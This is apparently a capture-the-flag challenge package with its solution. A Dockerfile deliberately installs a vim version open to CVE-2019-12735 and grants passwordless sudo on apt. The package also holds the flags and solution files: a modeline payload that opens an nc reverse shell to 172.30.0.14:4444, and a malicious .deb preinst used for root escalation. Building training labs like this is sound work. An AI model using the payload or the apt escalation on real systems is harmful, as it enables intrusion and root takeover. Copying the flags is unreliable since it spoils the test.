{
    "Dockerfile": "FROM debian:buster-slim\nMAINTAINER Addison Crump \"addisoncrump@tamu.edu\"\n\nCOPY headless_handler.sh /usr/bin/headless_handler.sh\nCOPY server.sh /usr/bin/server.sh\nCOPY flag2.txt /root/flag.txt\n\nRUN apt update; apt -y --autoremove full-upgrade\nRUN apt -y install libgpm2 libtinfo5 lsb-base netcat python3 socat screen sudo wget xxd\nRUN cd /tmp; \\\n      wget https://snapshot.debian.org/archive/debian/20190501T041322Z/pool/main/v/vim/vim-common_8.1.0875-2_all.deb; dpkg -i vim-common_8.1.0875-2_all.deb; \\\n      wget https://snapshot.debian.org/archive/debian/20190501T041322Z/pool/main/v/vim/vim-runtime_8.1.0875-2_all.deb; dpkg -i vim-runtime_8.1.0875-2_all.deb; \\\n      wget https://snapshot.debian.org/archive/debian/20190501T041322Z/pool/main/v/vim/vim_8.1.0875-2_amd64.deb; dpkg -i vim_8.1.0875-2_amd64.deb\nRUN apt-get autoremove\nRUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n\nRUN echo \":set modeline\" >> /etc/vim/vimrc\n\nRUN bash -c \"useradd -m -p $(python3 -c 'import crypt; print(crypt.crypt(\"c18317973315befdec209dbbce0222d4c0e65b14c2316dc1302e5cfcfabd23a8\"))') -s /bin/bash mwazowski\"\nCOPY note_to_self.txt /home/mwazowski/note_to_self.txt\nCOPY flag1.txt /home/mwazowski/flag.txt\nRUN apt-mark showmanual > /home/mwazowski/manually_installed_packages.txt\nRUN echo \"mwazowski ALL=NOPASSWD: /usr/bin/apt\" >> /etc/sudoers\nRUN rm -f /root/.bash_history\n\nCMD [\"su\", \"mwazowski\", \"-c\", \"/usr/bin/server.sh\"]\n",
    "flag1.txt": "gigem{ca7_1s7_t0_mak3_suRe}\n",
    "flag2.txt": "gigem{y0u_w0u1d_7h1nk_p3opl3_W0u1d_Kn0W_b3773r}\n",
    "headless_handler.sh": "#!/bin/bash\n\ntmp=$(mktemp)\n\nhandle_file() {\n  local screenname=$(echo $tmp | cut -d'.' -f 2-)\n\n  screen -S $screenname -dm sh -c \"cd $(dirname $(realpath $tmp)); vim $tmp\"\n  sleep 5\n  screen -S $screenname -X stuff \":q! $(echo -ne '\\r')\"\n  sleep 1\n  rm $tmp\n}\n\ncat > $tmp\nhandle_file & disown\n",
    "note_to_self.txt": "Apparently my packages are out of date. ITSEC is really throwing a fit about me\nneeding to update since red team popped my box.\n\nI'm sending them my installed packages. I have no idea how these guys got root\non my machine, my password is like 60 characters long. The only thing I have\nas nopasswd is apt, which I just use for updates anyway.\n",
    "README.md": "# Obituary\n\n```text\nHey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you're ready.\n\nYou're using vim, right? You should use it; it'll change your life. I basically depend on it for everything these days!\n```\n\n## Setup\n\n1. `docker build -t obituary .`\n2. `docker run --rm -d obituary`\n\n## Brief Dev Description\n\nSimple socat server which, per session, accepts a stream of text and writes it to a `mktemp`'d file. When the TCP\nstream is closed, the file is opened with vim (via screen), then closed and deleted after 5 seconds.\n\nUnfortunately for the host, the specific (I mean real specific) version of vim used is vulnerable to CVE-2019-12735.\nAdditionally, the user has left a apt source list as global rw and NOPASSWD'd apt.\n\n## Solution, pt 1\n\n```sh\n#!/bin/bash\n\ncat solution/pt1/payload.txt | nc -q 1 172.30.0.2 4321 &\nnc -lvnp 4444\n```\n\n`payload.txt` is simply a *slightly* modified version of\n[this](https://github.com/numirias/security/blob/master/data/2019-06-04_ace-vim-neovim/shell.txt).\n\nYou may need to modify the IPs in payload.txt and that shown above, but I doubt it.\n\n## Solution, pt 2\n\n1. `sudo apt install dh-make` (only on debian-based distros; you can do this on other distros with other tools)\n2. `cd solution/pt2`\n3. `./build.sh`\n4. In the shell gained from pt1: `nc -lp 5555 > exploit_0_all.deb`\n5. Original shell: `cat exploit_0_all.deb | nc -q 1 172.30.0.2 5555`\n6. pt1 shell: `sudo apt -y install ./exploit_0_all.deb`\n",
    "server.sh": "#!/bin/bash\n\nsocat -d -d -u tcp-l:4321,fork system:/usr/bin/headless_handler.sh\n",
    "solution\\pt1\\payload.txt": "\u001b[?7l\u001bSNothing here.\u001b:silent! w | call system('nohup nc 172.30.0.14 4444 -e /bin/sh &') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails('set\\ fde=x\\ \\|\\ source\\!\\ \\%') fdl=0: \u0016\u001b[1G\u0016\u001b[KNothing here.\"\u0016\u001b[D \n",
    "solution\\pt2\\build.sh": "#!/bin/bash\n\nmkdir -p exploit-0/debian/\ncp preinst exploit-0/debian/preinst\n\ncd exploit-0\ndh_make -yina\ndpkg-buildpackage -us -uc\n",
    "solution\\pt2\\preinst": "#!/bin/bash\n\ncat /root/flag.txt\n",
    "category": "NetworkPentest"
}